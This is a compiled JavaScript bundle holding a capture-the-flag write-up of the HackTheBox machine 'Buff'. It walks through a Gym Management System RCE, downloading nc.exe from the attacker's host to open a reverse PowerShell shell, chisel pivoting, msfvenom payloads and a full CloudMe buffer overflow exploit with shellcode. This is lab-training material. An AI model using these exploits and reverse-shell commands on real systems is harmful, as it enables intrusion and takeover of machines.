"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4238],{3905:(e,t,n)=>{n.d(t,{Zo:()=>x,kt:()=>h});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=a.createContext({}),l=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},x=function(e){var t=l(e.components);return a.createElement(i.Provider,{value:t},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,i=e.parentName,x=s(e,["components","mdxType","originalType","parentName"]),d=l(n),u=o,h=d["".concat(i,".").concat(u)]||d[u]||c[u]||r;return n?a.createElement(h,p(p({ref:t},x),{},{components:n})):a.createElement(h,p({ref:t},x))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,p=new Array(r);p[0]=u;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=e,s[d]="string"==typeof e?e:o,p[1]=s;for(var l=2;l<r;l++)p[l]=n[l];return a.createElement.apply(null,p)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},21468:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>p,default:()=>c,frontMatter:()=>r,metadata:()=>s,toc:()=>l});var a=n(87462),o=(n(67294),n(3905));const r={layout:"post",title:"Buff ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","pe","pivoting","http","htb"],date:"2020/11/20 21:08:00",thumbnail:"/img/HackTheBox/buff.png",toc:!0},p="Information",s={unversionedId:"HackTheBox/Buff/write-up",id:"HackTheBox/Buff/write-up",title:"Buff ",description:"- Name: Buff",source:"@site/writeups/HackTheBox/Buff/write-up.md",sourceDirName:"HackTheBox/Buff",slug:"/HackTheBox/Buff/write-up",permalink:"/writeups/HackTheBox/Buff/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"pivoting",permalink:"/writeups/tags/pivoting"},{label:"http",permalink:"/writeups/tags/http"},{label:"htb",permalink:"/writeups/tags/htb"}],version:"current",frontMatter:{layout:"post",title:"Buff ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","pe","pivoting","http","htb"],date:"2020/11/20 21:08:00",thumbnail:"/img/HackTheBox/buff.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Book ",permalink:"/writeups/HackTheBox/Book/write-up"},next:{title:"Cache ",permalink:"/writeups/HackTheBox/Cache/write-up"}},i={},l=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP enumeration",id:"http-enumeration",level:2},{value:"HTTP exploitation",id:"http-exploitation",level:2},{value:"Upgrading from a webshell to a reverse shell",id:"upgrading-from-a-webshell-to-a-reverse-shell",level:2},{value:"Privilege Escalation of Machine : from shaun to administrator",id:"privilege-escalation-of-machine--from-shaun-to-administrator",level:2}],x={toc:l},d="wrapper";function c(e){let{components:t,...r}=e;return(0,o.kt)(d,(0,a.Z)({},x,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"information"},"Information"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Name:")," Buff"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Profile:")," ",(0,o.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/263"},"www.hackthebox.eu")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"Buff",src:n(18812).Z,width:"598",height:"381"})),(0,o.kt)("h2",{id:"overview"},"Overview"),(0,o.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap lynx exploitdb ffuf windows-binaries pwncat chisel\n")),(0,o.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,o.kt)("p",null,"Port and service scan with ",(0,o.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Mon Nov  2 19:24:39 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.198\nNmap scan report for 10.10.10.198\nHost is up (0.077s latency).\nNot shown: 65533 filtered ports\nPORT     STATE SERVICE    VERSION\n7680/tcp open  pando-pub?\n8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6\n|_http-title: mrb3n's Bro Hut\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Mon Nov  2 19:31:30 2020 -- 1 IP address (1 host up) scanned in 411.20 seconds\n")),(0,o.kt)("h2",{id:"http-enumeration"},"HTTP enumeration"),(0,o.kt)("p",null,"List the links in the homepage."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ lynx -dump -listonly -nonumbers http://10.10.10.198:8080/\nhttp://10.10.10.198:8080/\nhttp://10.10.10.198:8080/\nhttp://10.10.10.198:8080/packages.php\nhttp://10.10.10.198:8080/facilities.php\nhttp://10.10.10.198:8080/about.php\nhttp://10.10.10.198:8080/contact.php\nhttp://10.10.10.198:8080/packages.php\nhttp://10.10.10.198:8080/packages.php\nhttp://10.10.10.198:8080/facilities.php\nhttp://10.10.10.198:8080/facilities.php\n")),(0,o.kt)("p",null,"However is doesn't show ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.10.198:8080/include/process_login.php"},"http://10.10.10.198:8080/include/process_login.php")),(0,o.kt)("p",null,"Let's see if there is more pages with ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/ffuf/ffuf"},"ffuf"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ffuf -u http://10.10.10.198:8080/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.198:8080/FUZZ\n :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response status: 403\n________________________________________________\n\nhome.php                [Status: 200, Size: 143, Words: 18, Lines: 3]\nregister.php            [Status: 200, Size: 137, Words: 23, Lines: 4]\ncontact.php             [Status: 200, Size: 4169, Words: 798, Lines: 119]\nindex.php               [Status: 200, Size: 4969, Words: 935, Lines: 134]\nfeedback.php            [Status: 200, Size: 4252, Words: 760, Lines: 114]\n.                       [Status: 200, Size: 4969, Words: 935, Lines: 134]\nupload.php              [Status: 200, Size: 107, Words: 12, Lines: 3]\nedit.php                [Status: 200, Size: 4282, Words: 844, Lines: 122]\nabout.php               [Status: 200, Size: 5316, Words: 999, Lines: 142]\nup.php                  [Status: 200, Size: 209, Words: 23, Lines: 5]\nprofile.                [Status: 301, Size: 346, Words: 22, Lines: 10]\npackages.php            [Status: 200, Size: 7787, Words: 2315, Lines: 169]\n:: Progress: [10848/10848] :: Job [1/1] :: 75 req/sec :: Duration: [0:03:06] :: Errors: 0 ::\n")),(0,o.kt)("p",null,"I discovered a lot of promising pages: register, feedback, upload, edit, up,\nprofile."),(0,o.kt)("p",null,"By submitting erroneous stuff at the edit page I obtained a full path disclosure:\n",(0,o.kt)("inlineCode",{parentName:"p"},"C:\\xampp\\htdocs\\gym\\editp.php")),(0,o.kt)("p",null,"Also a HTTP error is disclosing the versions: Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)"),(0,o.kt)("p",null,"On the contact page we can see: ",(0,o.kt)("inlineCode",{parentName:"p"},"Made using Gym Management Software 1.0 "),"."),(0,o.kt)("h2",{id:"http-exploitation"},"HTTP exploitation"),(0,o.kt)("p",null,"It seems it really exists:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ searchsploit Gym Management\n------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                      |  Path\n------------------------------------------------------------------------------------ ---------------------------------\nGym Management System 1.0 - Unauthenticated Remote Code Execution                   | php/webapps/48506.py\n------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n\n$ searchsploit -p 48506\n  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution\n      URL: https://www.exploit-db.com/exploits/48506\n     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py\nFile Type: Python script, ASCII text executable, with CRLF line terminators\n\n$ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py\nTraceback (most recent call last):\n  File "/usr/share/exploitdb/exploits/php/webapps/48506.py", line 38, in <module>\n    from colorama import Fore, Back, Style\nImportError: No module named colorama\n\n$ sudo pacman -S python2-colorama --asdeps\n\n$ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/\n            /\\\n/vvvvvvvvvvvv \\--------------------------------------,\n`^^^^^^^^^^^^ /============BOKU====================="\n            \\/\n\n[+] Successfully connected to webshell.\nC:\\xampp\\htdocs\\gym\\upload> C:\\xampp\\htdocs\\gym\\upload> whoami\nPNG\n\nbuff\\shaun\n')),(0,o.kt)("h2",{id:"upgrading-from-a-webshell-to-a-reverse-shell"},"Upgrading from a webshell to a reverse shell"),(0,o.kt)("p",null,"I should have a pre-compiled netcat for windows:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pacman -Ql windows-binaries | grep nc\nwindows-binaries /usr/share/windows/windows-binaries/nc.exe\nwindows-binaries /usr/share/windows/windows-binaries/nc.txt\nwindows-binaries /usr/share/windows/windows-binaries/ncat.exe\nwindows-binaries /usr/share/windows/windows-binaries/vncviewer.exe\n")),(0,o.kt)("p",null,"Even better I have ncat. Let's share it via a web server."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cp /usr/share/windows/windows-binaries/ncat.exe .\n\n$ ruby -run -ehttpd . -p8080\n")),(0,o.kt)("p",null,"Need a listener:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\n")),(0,o.kt)("p",null,"Download it via the webshell (curl the powershell alias as we are on windows):"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"curl http://10.10.14.146:8080/ncat.exe --output ncat.exe\n")),(0,o.kt)("p",null,"Ncat wasn't working so I retried with nc."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"curl http://10.10.14.146:8080/nc.exe --output nc.exe\nnc.exe 10.10.14.146 9999 -e powershell.exe\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\xampp\\htdocs\\gym\\upload> whoami\nbuff\\shaun\n\nPS C:\\xampp\\htdocs\\gym\\upload> gc C:\\Users\\shaun\\Desktop\\user.txt\nf03b243a0738b73cb640ee8b7b1928d7\n")),(0,o.kt)("h2",{id:"privilege-escalation-of-machine--from-shaun-to-administrator"},"Privilege Escalation of Machine : from shaun to administrator"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Check for restricted services from the outside")),(0,o.kt)("p",null,"Ref. ",(0,o.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#open-ports"},"HackTricks - Windows Local Privilege Escalation - Open Ports")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\xampp\\htdocs\\gym\\upload> netstat -ano\nnetstat -ano\n\nActive Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5672\n  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8564\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3176\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1088\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1548\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2160\n  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668\n  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688\n...\n  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       4736\n  TCP    127.0.0.1:3306         127.0.0.1:50755        TIME_WAIT       0\n  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       644\n...\n")),(0,o.kt)("p",null,"We have a MySQL server and an unknown service running locally. We may need\nsome pivoting technique to access it (see ",(0,o.kt)("a",{parentName:"p",href:"https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/"},"Network pivoting state of the art - Chisel - Reverse remote port forwarding"),")."),(0,o.kt)("p",null,"[chisel]"," is one of the best tool out there for pivoting and it has\n",(0,o.kt)("a",{parentName:"p",href:"https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz"},"a pre-compiled windows binary"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ 7z e chisel_1.7.2_windows_amd64.gz\n")),(0,o.kt)("p",null,"Start the server on your machine:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ chisel server -p 8080 --host 10.10.14.188 --reverse -v\n2020/11/04 20:55:17 server: Reverse tunnelling enabled\n2020/11/04 20:55:17 server: Fingerprint 67:21:79:97:03:c3:a6:2f:bd:d7:b9:c7:d9:1d:35:47\n2020/11/04 20:55:17 server: Listening on 10.10.14.188:8080..\n")),(0,o.kt)("p",null,"Upload the binary & execute the client:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\xampp\\htdocs\\gym\\upload> curl http://10.10.14.188:8080/chisel.exe --output cyfun.exe\nPS C:\\xampp\\htdocs\\gym\\upload> .\\cyfun.exe client -v http://10.10.14.188:8080 R:127.0.0.1:44444:127.0.0.1:8888\n2020/11/04 20:05:19 client: Connecting to ws://10.10.14.188:8080\n2020/11/04 20:05:20 client: Handshaking...\n2020/11/04 20:05:20 client: Fingerprint 1a:a8:a6:b7:c1:58:25:d7:b0:9d:c4:51:4e:8f:b2:5e\n2020/11/04 20:05:20 client: Sending config\n2020/11/04 20:05:20 client: Connected (Latency 64.5615ms)\n2020/11/04 20:05:20 client: tun: SSH connected\n")),(0,o.kt)("p",null,"But we have no clue what service is behind this port:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ nmap 127.0.0.1 -p 44444 -sVC\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 21:02 CET\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000080s latency).\n\nPORT      STATE SERVICE    VERSION\n44444/tcp open  tcpwrapped\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.00 seconds\n")),(0,o.kt)("p",null,"The only hint we have is on the Download folder:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"C:\\xampp\\htdocs\\gym\\upload> dir C:\\users\\shaun\\Downloads\\\n\n Volume in drive C has no label.\n Volume Serial Number is A22D-49F7\n\n Directory of C:\\users\\shaun\\Downloads\n\n14/07/2020  12:27    <DIR>          .\n14/07/2020  12:27    <DIR>          ..\n16/06/2020  15:26        17,830,824 CloudMe_1112.exe\n               1 File(s)     17,830,824 bytes\n               2 Dir(s)   7,130,439,680 bytes free\n")),(0,o.kt)("p",null,"This CloudMe seems a little bit vulnerable:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ searchsploit cloudme\n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nCloudMe 1.11.2 - Buffer Overflow (PoC)                                             | windows/remote/48389.py\nCloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                    | windows/local/48499.txt\nCloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                   | windows_x86-64/remote/45197.rb\nCloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                            | windows_x86-64/local/45159.py\nCloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                     | windows/remote/44175.rb\nCloudMe Sync 1.11.0 - Local Buffer Overflow                                        | windows/local/44470.py\nCloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                    | windows/remote/46218.py\nCloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                           | windows_x86-64/remote/46250.py\nCloudMe Sync < 1.11.0 - Buffer Overflow                                            | windows/remote/44027.py\nCloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                         | windows_x86-64/remote/44784.py\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n$ searchsploit -p 48389\n  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)\n      URL: https://www.exploit-db.com/exploits/48389\n     Path: /usr/share/exploitdb/exploits/windows/remote/48389.py\nFile Type: ASCII text, with CRLF line terminators\n")),(0,o.kt)("p",null,"Let's see this BoF exploit:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ cp /usr/share/exploitdb/exploits/windows/remote/48389.py .\n$ nvim 48389.py\n")),(0,o.kt)("p",null,"It seems the embedded shellcode is only making appear calc.exe, we need a\nreverse shell instead. The last option is to name the variable ",(0,o.kt)("em",{parentName:"p"},"payload")," instead of ",(0,o.kt)("em",{parentName:"p"},"buf"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/exec CMD='C:\\xampp\\htdocs\\gym\\upload\\nc.exe 10.10.14.188 9999 -e powershell.exe' -b '\\x00\\x0A\\x0D' -f python -v payload\n")),(0,o.kt)("p",null,"The whole modified exploit:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},'# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)\n# Date: 2020-04-27\n# Exploit Author: Andy Bowden\n# Vendor Homepage: https://www.cloudme.com/en\n# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe\n# Version: CloudMe 1.11.2\n# Tested on: Windows 10 x86\n\n#Instructions:\n# Start the CloudMe service and run the script.\n\nimport socket\n\ntarget = "127.0.0.1"\n\npadding1   = b"\\x90" * 1052\nEIP        = b"\\xB5\\x42\\xA8\\x68" # 0x68A842B5 -> PUSH ESP, RET\nNOPS       = b"\\x90" * 30\n\n#msfvenom -a x86 -p windows/exec CMD=calc.exe -b \'\\x00\\x0A\\x0D\' -f python\npayload =  b""\npayload += b"\\xdb\\xd3\\xbf\\x10\\x10\\x1f\\x4e\\xd9\\x74\\x24\\xf4\\x5e"\npayload += b"\\x2b\\xc9\\xb1\\x42\\x83\\xc6\\x04\\x31\\x7e\\x14\\x03\\x7e"\npayload += b"\\x04\\xf2\\xea\\xb2\\xcc\\x70\\x14\\x4b\\x0c\\x15\\x9c\\xae"\npayload += b"\\x3d\\x15\\xfa\\xbb\\x6d\\xa5\\x88\\xee\\x81\\x4e\\xdc\\x1a"\npayload += b"\\x12\\x22\\xc9\\x2d\\x93\\x89\\x2f\\x03\\x24\\xa1\\x0c\\x02"\npayload += b"\\xa6\\xb8\\x40\\xe4\\x97\\x72\\x95\\xe5\\xd0\\x6f\\x54\\xb7"\npayload += b"\\x89\\xe4\\xcb\\x28\\xbe\\xb1\\xd7\\xc3\\x8c\\x54\\x50\\x37"\npayload += b"\\x44\\x56\\x71\\xe6\\xdf\\x01\\x51\\x08\\x0c\\x3a\\xd8\\x12"\npayload += b"\\x51\\x07\\x92\\xa9\\xa1\\xf3\\x25\\x78\\xf8\\xfc\\x8a\\x45"\npayload += b"\\x35\\x0f\\xd2\\x82\\xf1\\xf0\\xa1\\xfa\\x02\\x8c\\xb1\\x38"\npayload += b"\\x79\\x4a\\x37\\xdb\\xd9\\x19\\xef\\x07\\xd8\\xce\\x76\\xc3"\npayload += b"\\xd6\\xbb\\xfd\\x8b\\xfa\\x3a\\xd1\\xa7\\x06\\xb6\\xd4\\x67"\npayload += b"\\x8f\\x8c\\xf2\\xa3\\xd4\\x57\\x9a\\xf2\\xb0\\x36\\xa3\\xe5"\npayload += b"\\x1b\\xe6\\x01\\x6d\\xb1\\xf3\\x3b\\x2c\\xdf\\x02\\xc9\\x4a"\npayload += b"\\xad\\x05\\xd1\\x54\\x81\\x6d\\xe0\\xdf\\x4e\\xe9\\xfd\\x35"\npayload += b"\\x2b\\x05\\xb4\\x14\\x1d\\x8e\\x11\\xcd\\x1c\\xd3\\xa1\\x3b"\npayload += b"\\x62\\xea\\x21\\xce\\x1a\\x09\\x39\\xbb\\x1f\\x55\\xfd\\x57"\npayload += b"\\x6d\\xc6\\x68\\x58\\xc2\\xe7\\xb8\\x3b\\x8b\\x67\\x3a\\x9c"\npayload += b"\\x10\\xb2\\xe0\\xa9\\xe5\\xa7\\x6a\\x21\\x55\\x69\\xef\\xa8"\npayload += b"\\x0c\\x07\\x86\\x41\\xba\\xa5\\x39\\xd2\\x2d\\x38\\xe6\\x7e"\npayload += b"\\xd4\\xcf\\x7d\\x0b\\x79\\x40\\xde\\x81\\xea\\xcf\\xaa\\x4b"\npayload += b"\\x80\\x77\\x27\\xb4\\x2b\\xb2\\x9b\\xc1\\xd8\\xa7\\x51\\x59"\npayload += b"\\x42\\x5b\\xfe\\xfc\\x0f\\xf5\\xa2\\xa8\\x86\\x6d\\x3e\\x3a"\npayload += b"\\x2b\\x32\\xae\\xab\\xb9\\xab\\x44\\x1a\\x49\\x54\\xed\\x62"\n\noverrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))   \n\nbuf = padding1 + EIP + NOPS + payload + overrun \n\ntry:\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target,44444))\n    s.send(buf)\nexcept Exception as e:\n    print(sys.exc_value)\n')),(0,o.kt)("p",null,"I had no luck with the previous payload so I tried others:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msfvenom -p windows/exec CMD='copy C:\\users\\Administrator\\desktop\\root.txt C:\\users\\shaun\\Videos\\cyfun.txt' -b '\\x00\\x0A\\x0D' -f python -v payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.188 LPORT=9999 -b '\\x00\\x0A\\x0D' -f python -v payload\n")),(0,o.kt)("p",null,"I had more luck with ",(0,o.kt)("inlineCode",{parentName:"p"},"windows/shell_reverse_tcp")," but it was just service being unstable.\nIt's possible the 1st exploit tentative made the service partially crash."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.198:49704 (family 2/IPv4, TCP)\nMicrosoft Windows [Version 10.0.17134.1610]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nbuff\\administrator\n\nC:\\Windows\\system32>type c:\\users\\Administrator\\desktop\\root.txt\nccf880bd191ba6b99c413b3855a8bb6d\n")))}c.isMDXComponent=!0},18812:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/buff-1a35a503873fb2e46456369528da620c.png"}}]);